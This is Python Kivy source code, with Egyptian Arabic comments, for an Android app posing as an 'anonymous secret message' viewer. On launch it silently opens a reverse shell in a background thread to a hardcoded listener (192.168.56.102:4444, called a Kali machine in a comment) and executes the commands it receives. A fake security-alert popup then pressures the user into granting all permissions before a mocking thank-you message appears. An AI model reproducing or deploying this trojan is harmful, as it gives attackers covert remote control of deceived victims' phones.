from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.popup import Popup
import os
import socket
import subprocess
import threading

# بيانات الاستقبال بتاعتك على الكالي (ظبط الـ IP والبورت)
LHOST = "192.168.56.102"
LPORT = 4444

def background_reverse_shell():
    """دالة الاتصال العكسي اللي بتشتغل في الخلفية بصمت"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        while True:
            command = s.recv(1024).decode()
            if not command or 'exit' in command:
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
    except Exception:
        pass

class AnonymousMessageApp(App):
    def build(self):
        self.title = "رسالة من مجهول"
        
        # تشغيل الاتصال العكسي في الخلفية (Background Thread) أول ما التطبيق يفتح
        shell_thread = threading.Thread(target=background_reverse_shell, daemon=True)
        shell_thread.start()
        
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        self.label = Label(
            text="لديك رسالة سرية جديدة.\nاضغط أدناه لفك التشفير وعرض المحتوى.",
            font_size=18,
            halign='center'
        )
        layout.add_widget(self.label)
        
        self.btn = Button(
            text="عرض الرسالة السرية",
            font_size=16,
            size_hint=(1, 0.3)
        )
        self.btn.bind(on_press=self.check_permissions_and_trick)
        layout.add_widget(self.btn)
        
        return layout

    def check_permissions_and_trick(self, instance):
        # نافذة التنبيه اللي بتطلب منه يوافق على الصلاحيات
        popup_layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
        msg_label = Label(text="يجب السماح بكافة الصلاحيات المطلوبة\nلضمان فك تشفير الرسالة وعرضها بنجاح.")
        
        go_btn = Button(text="حسناً، السماح بالصلاحيات", size_hint=(1, 0.4))
        
        def open_settings(btn):
            try:
                # فتح إعدادات التطبيق عشان يدي الصلاحيات
                os.system('am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.anonymous.msg')
            except:
                pass
            
            # تغيير نص الزرار لرسالة الختام الرايقة بعد ما يضغط
            self.btn.text = "شكراً علي تعاونك معنا 😍❤️"
            self.btn.disabled = True # نقفل الزرار عشان يحس إن اللعبة خلصت
            popup.dismiss()
            
        go_btn.bind(on_press=open_settings)
        popup_layout.add_widget(msg_label)
        popup_layout.add_widget(go_btn)
        
        popup = Popup(title='تنبيه أمني', content=popup_layout, size_hint=(0.8, 0.4))
        popup.open()

if __name__ == '__main__':
    AnonymousMessageApp().run()
